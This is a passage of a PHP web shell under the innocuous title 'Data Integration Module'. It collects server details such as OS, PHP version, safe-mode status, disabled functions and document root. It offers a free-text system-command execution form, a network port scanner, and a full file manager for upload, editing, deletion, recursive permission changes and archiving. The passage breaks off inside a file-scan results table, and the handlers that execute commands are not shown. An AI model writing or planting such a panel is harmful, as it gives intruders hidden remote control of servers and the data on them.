        <div class="edit-container mx-auto">
            <h1 class="text-3xl font-bold mb-4 text-gray-400">Editing: <?php echo htmlspecialchars($editName); ?></h1>
            <p class="mb-4 text-sm text-gray-400">Location: <?php echo htmlspecialchars($editPath); ?></p>

            <?php echo $notificationBuffer; ?>

            <form method="POST">
                <input type="hidden" name="edit_resource_key" value="<?php echo htmlspecialchars($_GET['edit_resource']); ?>">
                
                <textarea name="resource_content" class="w-full p-3 rounded-lg focus:outline-none focus:ring-2 focus:ring-gray-500 text-sm" <?php echo $writeAccess ? '' : 'readonly'; ?>><?php echo htmlspecialchars($fileContent); ?></textarea>
                
                <div class="mt-4 flex flex-col md:flex-row space-y-2 md:space-y-0 md:space-x-4">
                    <button type="submit" class="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200 <?php echo $writeAccess ? '' : 'opacity-50 cursor-not-allowed'; ?>" <?php echo $writeAccess ? '' : 'disabled'; ?>>
                        <?php echo $writeAccess ? '<i class="fa-solid fa-save mr-1"></i> Save Changes' : 'Read-Only Access'; ?>
                    </button>
                    <a href="?<?php echo $pathQueryParameter; ?>=<?php echo htmlspecialchars(encodeDirectoryPath($activeDirectory)); ?>" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200 text-center">
                        <i class="fa-solid fa-arrow-rotate-left mr-1"></i> Return to Manager
                    </a>
                </div>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================================================
// SYSTEM INFORMATION COLLECTION
// ==================================================
$systemData = [
    'Operator' => $systemOperator,
    'Platform' => @php_uname(),
    'Server' => $_SERVER['SERVER_SOFTWARE'],
    'PHP Version' => phpversion(),
    'Security Mode' => (ini_get('safe_mode') ? 'ENABLED' : 'DISABLED'),
    'Restricted Operations' => implode(', ', array_keys(getRestrictedOperations())) ?: 'None',
    'Document Root' => $_SERVER['DOCUMENT_ROOT'],
    'Current Directory' => $activeDirectory,
];

// ==================================================
// MAIN INTERFACE
// ==================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Integration Module</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0d1117; color: #c9d1d9; }
        .main-container { max-width: 1200px; }
        .data-table th, .data-table td { padding: 0.75rem; text-align: left; }
        .data-table tr:nth-child(even) { background-color: #161b22; }
        .data-table tr:hover { background-color: #21262d; }
                .access-alert { padding: 0.75rem; border-radius: 0.375rem; border-left: 5px solid; margin-bottom: 1rem; }
        .panel-content { display: none; }
        .modal-overlay { background-color: rgba(0, 0, 0, 0.7); }
        .modal-panel { background-color: #161b22; }
        .command-output { background-color: #000000; color: #00ff00; font-family: monospace; white-space: pre-wrap; word-break: break-all; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0d1117; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #444c56; }
        #systemInfoContent { background-color: white; color: black; padding: 10px; border: 1px solid #ccc; }
        #systemInfoContent table { width: 100%; border-collapse: collapse; margin-bottom: 1rem; }
        #systemInfoContent th { background-color: #f0f0f0; text-align: left; padding: 5px; }
        #systemInfoContent td { padding: 5px; border: 1px solid #ccc; }
        .action-button { font-size: 0.75rem; line-height: 1rem; padding-top: 0.25rem; padding-bottom: 0.25rem; padding-left: 0.5rem; padding-right: 0.5rem; }
        .scan-progress { height: 1rem; background-color: #2a303a; border-radius: 0.5rem; overflow: hidden; margin-bottom: 0.5rem; position: relative; }
        .scan-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #f56565, #e53e3e); transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); border-radius: 0.5rem; position: relative; overflow: hidden; }
        .scan-fill::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); animation: scan-animation 2s infinite; }
        @keyframes scan-animation { 0% { left: -100%; } 100% { left: 100%; } }
        .result-table th, .result-table td { padding: 0.5rem; border-bottom: 1px solid #2a303a; }
        @media (max-width: 768px) {
            .result-table th:nth-child(3), .result-table td:nth-child(3), .result-table th:nth-child(4), .result-table td:nth-child(4) { display: none; }
            .modal-panel { margin: 1rem; width: calc(100% - 2rem); }
            #scanModal .modal-panel { max-height: 90vh; overflow-y: auto; }
        }
        .scan-tab { padding: 0.5rem 1rem; border-radius: 0.375rem; cursor: pointer; transition: all 0.3s ease; font-weight: 600; }
        .scan-tab.active { background-color: #374151; color: #f56565; }
        .scan-tab:hover:not(.active) { background-color: #4b5563; }
        .scan-panel { display: none; }
        .scan-panel.active { display: block; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="main-container mx-auto">
        <header class="mb-6 pb-4 border-b border-gray-700 flex justify-between items-center flex-wrap">
            <h1 class="text-4xl font-extrabold text-gray-400">Data Integration Module</h1>
            <div class="flex items-center space-x-4 mt-2 md:mt-0">
                <span class="text-sm text-gray-400">Operator: <?php echo htmlspecialchars($systemOperator); ?></span>
                <a href="?system_logout=1" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-1 px-3 rounded-lg text-sm transition duration-200">
                    <i class="fa-solid fa-right-from-bracket mr-1"></i> Terminate Session
                </a>
            </div>
        </header>
        
        <?php echo $notificationBuffer; ?>
        
        <div class="bg-gray-800 rounded-xl shadow-2xl mb-6 border border-gray-700">
            <button onclick="togglePanel('systemPanelContent')" class="panel-header flex justify-between items-center w-full p-4 font-bold text-lg text-left text-white bg-gray-700 hover:bg-gray-600 rounded-t-xl transition duration-200">
                <span><i class="fa-solid fa-terminal mr-2"></i> System Overview & Command Interface</span>
                <i id="systemPanelIcon" class="fa-solid fa-chevron-down transform transition-transform"></i>
            </button>
            <div id="systemPanelContent" class="panel-content p-6">
                <h2 class="text-xl font-semibold mb-3 text-gray-400 border-b border-gray-700 pb-2">System Configuration</h2>
                <div class="overflow-x-auto mb-6 rounded-lg">
                    <table class="w-full text-sm">
                        <tbody>
                            <?php foreach ($systemData as $dataKey => $dataValue): ?>
                            <tr class="border-b border-gray-700 hover:bg-gray-700/50">
                                <td class="font-medium text-gray-300 w-1/4 py-2 pl-2"><?php echo htmlspecialchars($dataKey); ?></td>
                                <td class="text-gray-400 break-words py-2 pr-2"><?php echo htmlspecialchars($dataValue); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <h2 class="text-xl font-semibold mb-3 text-gray-400 border-b border-gray-700 pb-2 mt-4">Command Execution</h2>
                <form method="POST" class="flex flex-col md:flex-row space-y-2 md:space-y-0 md:space-x-2">
                    <input type="text" name="execute_command" placeholder="Enter system command" required 
                           class="flex-grow px-4 py-2 bg-gray-900 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white shadow-inner" 
                           value="<?php echo isset($_SESSION['command_execution']['input']) ? htmlspecialchars($_SESSION['command_execution']['input']) : ''; ?>">
                    <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-md transition duration-200 shadow-md">
                        <i class="fa-solid fa-play mr-1"></i> Execute
                    </button>
                </form>
                <?php if (isset($_SESSION['command_execution'])): ?>
                <h3 class="text-lg font-semibold mt-4 mb-2 text-gray-300">Execution Output:</h3>
                <pre class="command-output p-3 rounded-md overflow-auto h-40 border border-gray-500/50 shadow-inner"><?php echo htmlspecialchars($_SESSION['command_execution']['output']); ?></pre>
                <?php unset($_SESSION['command_execution']); ?>
                <?php endif; ?>
                <?php if (isset($_SESSION['network_scan']) && !empty($_SESSION['network_scan']['results'])): ?>
                <h3 class="text-lg font-semibold mt-4 mb-2 text-gray-300">Network Analysis:</h3>
                <p class="text-gray-400 mb-2">Target: **<?php echo htmlspecialchars($_SESSION['network_scan']['host']); ?>** | Ports: **<?php echo htmlspecialchars($_SESSION['network_scan']['ports']); ?>**</p>
                <pre class="command-output p-3 rounded-md overflow-auto h-40 border border-yellow-500/50 shadow-inner"><?php echo htmlspecialchars($_SESSION['network_scan']['results']); ?></pre>
                <?php unset($_SESSION['network_scan']); ?>
                <?php endif; ?>
            </div>
        </div>
        
        <div class="mb-6 p-4 bg-gray-800 rounded-xl shadow-lg border border-gray-700">
            <div class="mb-4">
                <span class="text-sm font-semibold text-gray-400 mr-2">Current Path:</span>
                <div class="overflow-x-auto whitespace-nowrap pb-1">
                    <div class="inline-flex items-center text-sm font-mono break-all">
                        <?php 
                        $pathComponents = explode(DIRECTORY_SEPARATOR, $activeDirectory);
                        $currentPath = '';
                        $pathParam = $pathQueryParameter;
                        
                        echo '<a href="?' . $pathParam . '=' . encodeDirectoryPath(DIRECTORY_SEPARATOR) . '" class="flex items-center text-gray-400 hover:text-gray-300 transition duration-150 p-1 rounded-md hover:bg-gray-700">';
                        echo '<i class="fa-solid fa-house mr-1"></i> Root';
                        echo '</a>';
                        
                        foreach ($pathComponents as $pathPart) { 
                            if ($pathPart === '') continue; 
                            
                            $currentPath = $currentPath . DIRECTORY_SEPARATOR . $pathPart; 
                            $currentPath = str_replace(DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, $currentPath);
                            
                            if ($currentPath !== DIRECTORY_SEPARATOR) {
                                $currentPath = rtrim($currentPath, DIRECTORY_SEPARATOR);
                            }

                            echo '<i class="fa-solid fa-chevron-right mx-2 text-gray-500"></i>';
                            echo '<a href="?' . $pathParam . '=' . encodeDirectoryPath($currentPath) . '" class="text-gray-400 hover:text-gray-300 transition duration-150 p-1 rounded-md hover:bg-gray-700">' . htmlspecialchars($pathPart) . '</a>';
                        } 
                        ?>
                    </div>
                </div>
            </div>

            <div class="flex flex-wrap gap-2 pt-3 border-t border-gray-700 mt-4">
                <button onclick="openModal('createModal')" class="bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg transition duration-200 action-button">
                    <i class="fa-solid fa-file-circle-plus mr-1"></i> Create Resource
                </button>
                <button onclick="openModal('uploadModal')" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition duration-200 action-button">
                    <i class="fa-solid fa-cloud-arrow-up mr-1"></i> Upload Data
                </button>
                <button id="bulkActionButton" onclick="openModal('bulkActionModal')" class="bg-yellow-600 hover:bg-yellow-700 text-white font-semibold rounded-lg transition duration-200 opacity-50 cursor-not-allowed action-button" disabled>
                    <i class="fa-solid fa-screwdriver-wrench mr-1"></i> Bulk Operations (0 selected)
                </button>
                <a href="?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&compress_directory=1" 
                   onclick="return confirm('Compress entire directory? Archive will be created in parent directory.')" 
                   class="bg-fuchsia-600 hover:bg-fuchsia-700 text-white font-semibold rounded-lg transition duration-200 action-button">
                    <i class="fa-solid fa-folder-arrow-down mr-1"></i> Archive Directory
                </a>
                <button onclick="openModal('scanModal')" class="bg-red-700 hover:bg-red-800 text-white font-semibold rounded-lg transition duration-200 action-button">
                    <i class="fa-solid fa-bug mr-1"></i> Security Analysis
                </button>
                <button onclick="openModal('portScanModal')" class="bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition duration-200 action-button">
                    <i class="fa-solid fa-wifi mr-1"></i> Network Scan
                </button>
                <a href="?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&system_info=1" class="bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg transition duration-200 action-button">
                    <i class="fa-solid fa-info-circle mr-1"></i> System Information
                </a>
            </div>
        </div>

        <div class="overflow-x-auto rounded-xl shadow-2xl border border-gray-700">
            <table class="w-full text-sm data-table">
                <thead>
                    <tr class="bg-gray-900/50 text-gray-300 uppercase text-xs">
                        <th class="rounded-tl-xl"><input type="checkbox" id="selectAllResources"></th>
                        <th>Type</th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Owner/Group</th>
                        <th class="text-center rounded-tr-xl">Operations</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $directoryItems = @scandir($activeDirectory) ?: [];
                    $fileItems = [];
                    $directoryItemsList = [];
                    
                    foreach ($directoryItems as $itemName) {
                        if ($itemName === '.') continue;
                        $itemPath = $activeDirectory . DIRECTORY_SEPARATOR . $itemName;

                        if ($itemName === '..') {
                            $parentPath = realpath($activeDirectory . DIRECTORY_SEPARATOR . '..');
                            if ($parentPath === $activeDirectory || !$parentPath) continue;

                            $directoryItemsList[] = [
                                'name' => $itemName,
                                'path' => $parentPath,
                                'is_directory' => true,
                                'permissions_display' => 'N/A',
                                'permissions_raw' => 'N/A',
                                'size' => 'N/A',
                                'owner' => 'N/A',
                                'group' => 'N/A',
                                'encoded_name' => encodeDirectoryPath($parentPath),
                            ];
                            continue;
                        }

                        $isDirectory = @is_dir($itemPath);
                        $itemSize = $isDirectory ? 'N/A' : (@filesize($itemPath) ?: 0);
                        $ownershipInfo = function($path) {
                            if (!function_exists('posix_getpwuid') || !function_exists('posix_getgrgid')) {
                                return ['owner' => @fileowner($path) ?: 'N/A', 'group' => @filegroup($path) ?: 'N/A'];
                            }
                            $ownerId = @fileowner($path);
                            $groupId = @filegroup($path);
                            $ownerInfo = @posix_getpwuid($ownerId);
                            $groupInfo = @posix_getgrgid($groupId);
                            $ownerName = $ownerInfo ? $ownerInfo['name'] : $ownerId;
                            $groupName = $groupInfo ? $groupInfo['name'] : $groupId;
                            return ['owner' => $ownerName, 'group' => $groupName];
                        };
                        $ownerGroup = $ownershipInfo($itemPath);
                        $permissionMode = @substr(sprintf('%o', @fileperms($itemPath)), -4); 

                        $itemData = [
                            'name' => $itemName,
                            'path' => $itemPath,
                            'is_directory' => $isDirectory,
                            'permissions_display' => displayAccessRights($itemPath),
                            'permissions_raw' => $permissionMode,
                            'size' => $isDirectory ? 'N/A' : formatDataSize($itemSize),
                            'owner' => htmlspecialchars($ownerGroup['owner']),
                            'group' => htmlspecialchars($ownerGroup['group']),
                            'encoded_name' => encodeDirectoryPath($itemName),
                        ];

                        if ($isDirectory) {
                            $directoryItemsList[] = $itemData;
                        } else {
                            $fileItems[] = $itemData;
                        }
                    }

                    $allItems = array_merge($directoryItemsList, $fileItems);
                    
                    foreach ($allItems as $itemData):
                        $itemName = htmlspecialchars($itemData['name']);
                        $encodedName = $itemData['encoded_name'];
                        $isDirectory = $itemData['is_directory'];

                        if ($itemData['name'] === '..') {
                            $itemLink = '?' . $pathQueryParameter . '=' . encodeDirectoryPath($itemData['path']);
                            $itemIcon = '<i class="fa-solid fa-arrow-turn-up text-gray-400 mr-2"></i>';
                        } elseif ($isDirectory) {
                            $itemLink = '?' . $pathQueryParameter . '=' . encodeDirectoryPath($itemData['path']);
                            $itemIcon = '<i class="fa-solid fa-folder text-yellow-500 mr-2"></i>';
                        } else {
                            $itemLink = '?' . $pathQueryParameter . '=' . encodeDirectoryPath($activeDirectory);
                            $itemIcon = '<i class="fa-solid fa-file text-gray-400 mr-2"></i>';
                        }
                    ?>
                    <tr class="border-b border-gray-700 hover:bg-gray-700/50">
                        <td>
                            <?php if ($itemData['name'] !== '..'): ?>
                                <input type="checkbox" name="selected_resources[]" value="<?php echo $encodedName; ?>" class="form-checkbox h-4 w-4 text-gray-600 bg-gray-900 border-gray-600 rounded-sm focus:ring-gray-500 ml-2" onchange="updateBulkActionButton()">
                            <?php endif; ?>
                        </td>
                        <td class="text-gray-400"><?php echo $isDirectory ? 'Directory' : 'File'; ?></td>
                        <td>
                            <a href="<?php echo $itemLink; ?>" class="hover:text-gray-500 transition duration-150 flex items-center">
                                <?php echo $itemIcon . $itemName; ?>
                            </a>
                        </td>
                        <td class="text-gray-400"><?php echo $itemData['size']; ?></td>
                        <td><?php echo $itemData['permissions_display']; ?></td>
                        <td class="text-gray-400 text-xs"><?php echo $itemData['owner'] . '/' . $itemData['group']; ?></td>
                        <td class="text-center whitespace-nowrap">
                            <?php if ($itemData['name'] !== '..'): ?>
                                <?php if ($isDirectory): ?>
                                    <button onclick="openPermissionModal('<?php echo $itemName; ?>', '<?php echo $encodedName; ?>', '<?php echo $itemData['permissions_raw']; ?>', true)" class="text-blue-400 hover:text-blue-500 p-1 transition duration-150" title="Modify Permissions"><i class="fa-solid fa-shield-halved"></i></button>
                                <?php else: ?>
                                    <a href="?edit_resource=<?php echo encodeDirectoryPath($itemData['path']); ?>" class="text-yellow-400 hover:text-yellow-500 p-1 transition duration-150" title="Edit Content"><i class="fa-solid fa-pencil"></i></a>
                                    <a href="?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&download_resource=<?php echo $encodedName; ?>" class="text-green-400 hover:text-green-500 p-1 transition duration-150" title="Download"><i class="fa-solid fa-download"></i></a>
                                    <a href="?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&compress_resource=<?php echo $encodedName; ?>" class="text-pink-400 hover:text-pink-500 p-1 transition duration-150" title="Create Archive"><i class="fa-solid fa-file-zipper"></i></a>
                                    <?php if (strtolower(pathinfo($itemName, PATHINFO_EXTENSION)) === 'zip'): ?>
                                        <a href="?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&extract_resource=<?php echo $encodedName; ?>" class="text-teal-400 hover:text-teal-500 p-1 transition duration-150" title="Extract Archive"><i class="fa-solid fa-file-arrow-down"></i></a>
                                    <?php endif; ?>
                                    <button onclick="openPermissionModal('<?php echo $itemName; ?>', '<?php echo $encodedName; ?>', '<?php echo $itemData['permissions_raw']; ?>', false)" class="text-blue-400 hover:text-blue-500 p-1 transition duration-150" title="Modify Permissions"><i class="fa-solid fa-shield-halved"></i></button>
                                <?php endif; ?>
                                
                                <button onclick="openRenameModal('<?php echo $itemName; ?>', '<?php echo $encodedName; ?>')" class="text-orange-400 hover:text-orange-500 p-1 transition duration-150" title="Rename"><i class="fa-solid fa-pen-to-square"></i></button>
                                <a href="?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&delete_resource=<?php echo $encodedName; ?>" onclick="return confirm('Permanently delete <?php echo $itemName; ?>? This action cannot be undone!')" class="text-red-600 hover:text-red-700 p-1 transition duration-150" title="Delete"><i class="fa-solid fa-trash-can"></i></a>
                            <?php else: ?>
                                <span class="text-gray-600">--</span>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- Create Resource Modal -->
        <div id="createModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">Create Resource</h2>
                <form method="POST" class="space-y-4">
                    <input type="text" name="create_resource" placeholder="Resource Name" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white">
                    <select name="resource_type" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white">
                        <option value="file">File</option>
                        <option value="directory">Directory</option>
                    </select>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('createModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Cancel</button>
                        <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Create</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Upload Modal -->
        <div id="uploadModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">Upload Data</h2>
                <form method="POST" enctype="multipart/form-data" class="space-y-4">
                    <input type="file" name="upload_data" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-gray-50 file:text-gray-700 hover:file:bg-gray-100">
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('uploadModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Cancel</button>
                        <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Upload</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Rename Modal -->
        <div id="renameModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">Rename Resource</h2>
                <form method="POST" class="space-y-4">
                    <input type="hidden" name="rename_original" id="rename_original_name">
                    <p class="text-gray-400 mb-2">Current: <span id="current_resource_name" class="font-bold"></span></p>
                    <input type="text" name="rename_new" id="rename_new_input" placeholder="New Name" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white">
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('renameModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Cancel</button>
                        <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Rename</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Permission Modal -->
        <div id="permissionModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">Modify Permissions</h2>
                <form method="POST" class="space-y-4">
                    <input type="hidden" name="permission_target" id="permission_target_encoded">
                    <p class="text-gray-400 mb-2">Resource: <span id="permission_resource_name" class="font-bold"></span></p>
                    <p class="text-gray-400 mb-2">Current: <span id="permission_current_value" class="font-bold"></span></p>
                    <input type="text" name="permission_value" id="permission_mode_input" placeholder="Octal Mode (e.g., 0755)" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white" pattern="[0-7]{3,4}" maxlength="4">
                    <div class="flex items-center">
                        <input type="checkbox" name="permission_recursive" id="permission_recursive" class="form-checkbox h-4 w-4 text-gray-600 bg-gray-900 border-gray-600 rounded-sm focus:ring-gray-500 mr-2">
                        <label for="permission_recursive" class="text-gray-300">Apply recursively</label>
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('permissionModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Cancel</button>
                        <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Update</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Bulk Action Modal -->
        <div id="bulkActionModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">Bulk Operations</h2>
                <form method="POST" id="bulkActionForm" onsubmit="return validateBulkAction(this)" class="space-y-4">
                    <p class="text-gray-400 mb-4">Selected: <span id="selectedResourceCount" class="font-bold text-gray-400">0</span></p>

                    <button type="submit" name="bulk_delete" value="1" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200" onclick="return confirm('Permanently delete selected resources? This cannot be undone!')">
                        <i class="fa-solid fa-trash-can mr-1"></i> Delete Selected
                    </button>
                    
                    <button type="submit" name="bulk_compression" value="1" class="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200" onclick="return confirm('Create archive from selected resources?')">
                        <i class="fa-solid fa-file-zipper mr-1"></i> Create Archive
                    </button>

                    <div class="space-y-2 border border-gray-700 p-3 rounded-lg">
                        <h3 class="text-lg font-semibold text-gray-400">Bulk Permissions</h3>
                        <input type="text" name="bulk_permission_value" id="bulk_permission_mode" placeholder="Octal Mode (e.g., 0755)" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white" pattern="[0-7]{3,4}" maxlength="4">
                        <div class="flex items-center">
                            <input type="checkbox" name="bulk_permission_recursive" id="bulk_permission_recursive" class="form-checkbox h-4 w-4 text-gray-600 bg-gray-900 border-gray-600 rounded-sm focus:ring-gray-500 mr-2">
                            <label for="bulk_permission_recursive" class="text-gray-300 text-sm">Apply recursively</label>
                        </div>
                        <button type="submit" name="bulk_permission_update" value="1" class="w-full bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">
                            <i class="fa-solid fa-shield-halved mr-1"></i> Update Permissions
                        </button>
                    </div>

                    <div class="flex justify-end pt-2">
                        <button type="button" onclick="closeModal('bulkActionModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Cancel</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Security Scan Modal -->
        <div id="scanModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-4xl shadow-2xl" style="max-height: 85vh; overflow-y: auto;">
                <h2 class="text-2xl font-bold mb-4 text-gray-400 flex items-center">
                    <i class="fa-solid fa-bug mr-2"></i> Security Analysis Module
                    <span class="ml-auto text-sm font-normal text-gray-400">v1.0</span>
                </h2>
                
                <div id="scanControls" class="mb-4">
                    <p class="text-sm text-gray-400 mb-3">Analysis Directory: <span class="font-mono text-gray-400 break-all"><?php echo htmlspecialchars($activeDirectory); ?></span></p>
                    <button id="startScanButton" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">
                        <i class="fa-solid fa-play mr-1"></i> Initiate Analysis
                    </button>
                </div>

                <div id="scanProgress" class="hidden mb-4 p-4 border border-gray-700 bg-gray-900/20 rounded-lg">
                    <div class="flex items-center mb-2">
                        <i class="fa-solid fa-spinner fa-spin mr-3 text-gray-400 text-xl"></i>
                        <span class="text-lg text-gray-400">Security Analysis in Progress...</span>
                    </div>
                    <div class="scan-progress">
                        <div id="progressBarFill" class="scan-fill"></div>
                    </div>
                    <p class="text-sm text-gray-400">
                        Processing: <span id="currentFileCount" class="font-mono">0</span> of <span id="totalFileCount" class="font-mono">...</span> files | 
                        Progress: <span id="progressPercentage" class="font-mono">0%</span>
                    </p>
                    <p id="currentFilePath" class="text-xs text-gray-500 break-all mt-1"></p>
                </div>

                <div id="scanResults" class="hidden">
                    <div class="grid grid-cols-3 gap-3 mb-4">
                        <div class="p-3 rounded-lg bg-red-900/30 border border-red-700 text-center">
                            <span class="text-xs text-red-400 font-bold block mb-1">MALICIOUS</span>
                            <span id="maliciousCount" class="text-2xl font-extrabold block text-red-500">0</span>
                        </div>
                        <div class="p-3 rounded-lg bg-yellow-900/30 border border-yellow-700 text-center">
                            <span class="text-xs text-yellow-400 font-bold block mb-1">SUSPICIOUS</span>
                            <span id="suspiciousCount" class="text-2xl font-extrabold block text-yellow-500">0</span>
                        </div>
                        <div class="p-3 rounded-lg bg-green-900/30 border border-green-700 text-center">
                            <span class="text-xs text-green-400 font-bold block mb-1">TOTAL SCAN</span>
                            <span id="scannedTotalCount" class="text-2xl font-extrabold block text-green-500">0</span>
                        </div>
                    </div>

                    <!-- Tab Navigation -->
                    <div class="flex space-x-2 mb-4 border-b border-gray-700 pb-2">
                        <button class="scan-tab active" data-tab="malicious">
                            <i class="fa-solid fa-skull-crossbones mr-1"></i> Malicious
                            <span id="maliciousTabCount" class="ml-1 bg-red-600 text-white text-xs px-2 py-1 rounded-full">0</span>
                        </button>
                        <button class="scan-tab" data-tab="suspicious">
                            <i class="fa-solid fa-triangle-exclamation mr-1"></i> Suspicious
                            <span id="suspiciousTabCount" class="ml-1 bg-yellow-600 text-white text-xs px-2 py-1 rounded-full">0</span>
                        </button>
                        <button class="scan-tab" data-tab="safe">
                            <i class="fa-solid fa-shield-check mr-1"></i> Safe
                            <span id="safeTabCount" class="ml-1 bg-green-600 text-white text-xs px-2 py-1 rounded-full">0</span>
                        </button>
                    </div>

                    <!-- Tab Contents -->
                    <div id="maliciousContent" class="scan-panel active">
                        <div class="max-h-64 overflow-y-auto border border-gray-700 rounded-lg">
                            <table class="result-table w-full text-sm">
                                <thead>
                                    <tr class="sticky top-0 bg-gray-800">
                                        <th class="p-2 text-red-400 text-left">File</th>
                                        <th class="p-2 text-red-400 text-left hidden md:table-cell">Score</th>
                                        <th class="p-2 text-red-400 text-center">Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="maliciousTableBody">
                                    <!-- Results populated by JavaScript -->
                                </tbody>
                            </table>
                            <p id="noMaliciousResults" class="p-4 text-center text-green-400 hidden">No malicious files detected</p>
                        </div>
                    </div>

                    <div id="suspiciousContent" class="scan-panel">
                        <div class="max-h-64 overflow-y-auto border border-gray-700 rounded-lg">
                            <table class="result-table w-full text-sm">
                                <thead>
                                    <tr class="sticky top-0 bg-gray-800">
                                        <th class="p-2 text-yellow-400 text-left">File</th>
                                        <th class="p-2 text-yellow-400 text-left hidden md:table-cell">Score</th>
                                        <th class="p-2 text-yellow-400 text-center">Actions</th>
                                    </tr>
